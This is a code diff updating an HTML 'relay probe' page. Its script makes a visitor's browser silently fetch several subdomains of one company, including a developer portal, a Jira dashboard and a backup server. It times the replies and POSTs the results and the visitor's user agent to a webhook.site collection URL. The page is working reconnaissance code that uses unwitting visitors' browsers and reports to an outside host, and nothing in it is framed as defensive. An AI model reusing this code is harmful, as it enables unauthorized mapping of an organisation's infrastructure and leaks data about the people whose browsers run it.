@@ -1,13 +1,10 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe4</title></head>
-<body><h1>w1nd3x relay probe v4</h1><pre id="out"></pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe5</title></head>
+<body><h1>w1nd3x relay probe v5</h1><pre id="out"></pre>
 <script>
-const WH="https://webhook.site/e874bd7b-28ef-4011-b7fd-f73a0eb59565";
+const WH="https://webhook.site/50d69fd6-da64-4eff-b409-5274db2c23ab";
 const RUN=Math.random().toString(36).slice(2,8);
-function rep(tag,data){
-  try{ fetch(WH+"?run="+RUN+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(JSON.stringify(data).slice(0,1400)),{mode:'no-cors'}); }catch(e){}
-  document.getElementById('out').textContent+="\n"+tag+" "+JSON.stringify(data).slice(0,400);
-}
-// (label, method, url)  -- each expected to 3xx IF the origin is actually reached
+const RES=[];
+function send(obj){ try{ fetch(WH,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(obj)});}catch(e){} }
 const T=[
  ["dss-Home","GET","https://developer.bbpos.com/Home"],
  ["dss-login","GET","https://developer.bbpos.com/login"],
@@ -18,20 +15,21 @@ const T=[
  ["bms-root","GET","https://bms.bbpos.com/"],
  ["ctl-jira-dash","GET","https://bugs.bbpos.com/secure/Dashboard.jspa"],
  ["ctl-jira-root","GET","https://bugs.bbpos.com/"],
- ["ctl-redirect","GET","https://httpbingo.org/redirect/1"],
- ["ctl-200","GET","https://example.com/"]
+ ["ctl-200","GET","https://example.com/"],
+ ["ctl-emmsstatic","GET","https://api-static.emms.bbpos.com/"],
+ ["ctl-bmsbackup","GET","https://bms-backup.bbpos.com/"]
 ];
 async function probe(label,m,u){
  const q=u+(u.includes('?')?'&':'?')+"w1="+RUN;
- const t0=performance.now();
- let out={label:label,m:m};
- try{ const r=await fetch(q,{method:m,mode:'no-cors',redirect:'manual',credentials:'omit'});
-      out.type=r.type; out.redirected=r.redirected; }
- catch(e){ out.err=String(e).slice(0,70); }
- out.ms=Math.round(performance.now()-t0);
- rep("R",out);
+ const t0=performance.now(); let o={l:label,m:m};
+ try{ const r=await fetch(q,{method:m,mode:'no-cors',redirect:'manual',credentials:'omit'}); o.t=r.type; }
+ catch(e){ o.e=String(e).slice(0,50); }
+ o.ms=Math.round(performance.now()-t0); RES.push(o);
+ document.getElementById('out').textContent+="\n"+JSON.stringify(o);
 }
-(async()=>{ rep("hello",{v:4,ua:navigator.userAgent.slice(0,60)});
+(async()=>{
  for(const t of T){ await probe(t[0],t[1],t[2]); }
- rep("done",{}); await new Promise(r=>setTimeout(r,2000)); })();
+ send({run:RUN,v:5,ua:navigator.userAgent.slice(0,55),res:RES});
+ await new Promise(r=>setTimeout(r,2500));
+})();
 </script></body></html>
